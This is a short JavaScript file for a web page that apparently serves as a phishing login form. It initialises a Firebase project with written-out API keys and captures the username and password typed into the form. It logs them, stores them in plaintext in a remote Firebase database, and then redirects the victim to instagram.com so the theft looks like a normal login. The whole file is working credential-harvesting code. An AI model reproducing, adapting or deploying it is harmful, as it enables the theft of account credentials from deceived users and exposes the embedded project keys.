
  // Import the functions you need from the SDKs you need
import { initializeApp } from "https://www.gstatic.com/firebasejs/10.13.1/firebase-app.js";
import { getDatabase, ref, push, set } from "https://www.gstatic.com/firebasejs/10.13.1/firebase-database.js"
  // TODO: Add SDKs for Firebase products that you want to use
  // https://firebase.google.com/docs/web/setup#available-libraries

  // Your web app's Firebase configuration
  const firebaseConfig = {
    apiKey: "AIzaSyCSZalLT1a85OsKAiN6MUuwt7GJ7AaKf4M",
    authDomain: "hound-heaven.firebaseapp.com",
    databaseURL: "https://hound-heaven-default-rtdb.firebaseio.com",
    projectId: "hound-heaven",
    storageBucket: "hound-heaven.appspot.com",
    messagingSenderId: "502798814366",
    appId: "1:502798814366:web:2f669b7817abb2198ebf8f"
  };

  // Initialize Firebase
const app = initializeApp(firebaseConfig);
const db = getDatabase(app);
  
const userName = document.getElementById('userName')
const password = document.getElementById('password')
const submit = document.getElementById('loginSubmit')

submit.addEventListener('click', e => {
    const user = userName.value;
    const pass = password.value;
    console.log(`userName: ${userName.value}, password: ${password.value}`);
    if (user && pass) {
        console.log("storing");
        
        const userRef = ref(db, 'user');
        const newUserRef = push(userRef);

        set(newUserRef, {
        userName: user,
        password:pass
        }).then(() => {
            console.log('success');
            
            window.location.replace('https://instagram.com/');
        }).catch(() => {
            console.log("error");
            
        })
    }

   
    
})
